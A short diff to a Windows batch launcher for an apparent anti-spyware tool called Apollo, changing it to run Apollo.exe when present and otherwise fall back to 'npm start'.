@@ -14,5 +14,9 @@ echo 🎯 Protecting against: Pegasus, Lazarus, APT groups
 echo 💰 Crypto wallet security enabled
 echo.
 cd /d "%~dp0"
-npm start
+if exist "Apollo.exe" (
+    Apollo.exe
+) else (
+    npm start
+)
 pause
